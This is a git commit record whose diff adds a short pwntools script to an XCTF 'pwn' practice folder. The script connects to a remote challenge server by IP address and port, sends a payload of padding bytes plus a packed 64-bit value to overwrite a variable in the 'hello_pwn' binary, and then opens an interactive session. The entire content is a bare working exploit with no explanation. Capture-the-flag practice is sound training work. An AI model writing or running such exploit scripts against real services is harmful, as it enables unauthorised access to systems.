2aa3fe23fb5a217f8ed2832678a1b7215d4eadef
haysen <dduguye@gmail.com>
2020-04-07 23:29:58 +0800

    Update test.py

--- xctf/pwn/test.py
+++ xctf/pwn/test.py
@@ -1,2 +1,10 @@
-try
-test
+from pwn import *
+context(arch="amd64",os="linux",log_level="debug")
+p = remote("111.198.29.45",34044)
+#p = process("./hello_pwn")
+p.recvline()
+p.recvline()
+payload="A"*4+p64(1853186401)
+p.send(payload)
+p.interactive()
+
